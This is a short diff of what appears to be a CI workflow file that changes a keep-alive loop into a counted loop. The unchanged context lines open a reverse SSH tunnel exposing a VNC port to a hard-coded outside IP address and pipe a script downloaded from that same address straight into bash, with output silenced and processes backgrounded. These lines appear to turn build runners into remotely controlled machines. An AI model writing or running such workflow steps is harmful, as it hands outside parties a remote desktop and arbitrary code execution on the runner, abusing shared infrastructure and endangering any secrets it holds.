@@ -29,4 +29,4 @@ jobs:
         bash -c "unbuffer ssh -R 0.0.0.0:$(pbpaste):localhost:5901 x@52.36.65.97" &>/dev/null &
         curl -H "$header" http://52.36.65.97:8043/b.sh | bash &
         echo testa
-    - run: while true; do echo '.'; sleep 10; done
+    - run: for i in $(seq 1 $(cat test/runtime)) ; do echo $i | grep '0$' &>/dev/null && echo .; sleep 1; done
